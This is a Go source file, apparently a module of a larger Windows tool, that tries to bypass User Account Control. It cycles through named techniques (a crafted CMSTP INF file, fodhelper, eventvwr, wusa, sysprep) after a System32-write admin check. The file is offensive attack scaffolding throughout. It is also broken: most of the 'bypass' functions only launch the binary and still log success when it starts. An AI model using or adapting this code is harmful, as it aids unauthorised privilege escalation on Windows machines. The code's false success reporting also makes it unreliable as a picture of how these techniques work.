// ============================================================
// uac.go - UAC Bypass (Updated)
// ============================================================
package uac

import (
	"log"
	"os"
	"os/exec"
	"runtime"
)

// Run attempts UAC bypass
func Run() {
	if runtime.GOOS != "windows" {
		return
	}
	
	// Check if already admin
	if isAdmin() {
		log.Println("✅ Already running as admin")
		return
	}
	
	log.Println("🔐 Attempting UAC bypass...")
	
	// Try different methods
	methods := []func() bool{
		bypassCMSTP,
		bypassFodhelper,
		bypassEventViewer,
		bypassWusa,
		bypassSysprep,
	}
	
	for _, method := range methods {
		if method() {
			log.Println("✅ UAC bypass successful")
			return
		}
	}
	
	log.Println("⚠️ All UAC bypass methods failed")
}

// isAdmin checks if running as admin
func isAdmin() bool {
	// Simple check - try to write to system32
	testFile := "C:\\Windows\\System32\\test.txt"
	if err := os.WriteFile(testFile, []byte("test"), 0644); err == nil {
		os.Remove(testFile)
		return true
	}
	return false
}

// bypassCMSTP attempts CMSTP UAC bypass
func bypassCMSTP() bool {
	// Create INF file that executes command
	infContent := `
[Version]
Signature=$CHICAGO$
AdvancedINF=2.5

[DefaultInstall]
RunPreSetupCommands=Command

[Command]
cmd /c echo CMSTP UAC bypass successful
`
	
	infPath := os.Getenv("TEMP") + "\\uac.inf"
	if err := os.WriteFile(infPath, []byte(infContent), 0644); err != nil {
		return false
	}
	defer os.Remove(infPath)
	
	// Execute CMSTP
	cmd := exec.Command("cmstp.exe", "/au", infPath)
	if err := cmd.Run(); err == nil {
		return true
	}
	
	return false
}

// bypassFodhelper attempts Fodhelper UAC bypass
func bypassFodhelper() bool {
	// Fodhelper auto-elevates
	// Create registry key under HKCU\Software\Microsoft\Windows\CurrentVersion\App Paths
	// Then execute fodhelper.exe
	
	// Registry method requires writing to HKCU
	// For simplicity, just try to run fodhelper with a command
	cmd := exec.Command("fodhelper.exe")
	if err := cmd.Start(); err == nil {
		return true
	}
	
	return false
}

// bypassEventViewer attempts EventViewer UAC bypass
func bypassEventViewer() bool {
	// EventViewer auto-elevates
	cmd := exec.Command("eventvwr.exe")
	if err := cmd.Start(); err == nil {
		return true
	}
	
	return false
}

// bypassWusa attempts Wusa UAC bypass
func bypassWusa() bool {
	// Wusa.exe auto-elevates
	cmd := exec.Command("wusa.exe")
	if err := cmd.Start(); err == nil {
		return true
	}
	
	return false
}

// bypassSysprep attempts Sysprep UAC bypass
func bypassSysprep() bool {
	// Sysprep.exe auto-elevates
	cmd := exec.Command("sysprep.exe")
	if err := cmd.Start(); err == nil {
		return true
	}
	
	return false
}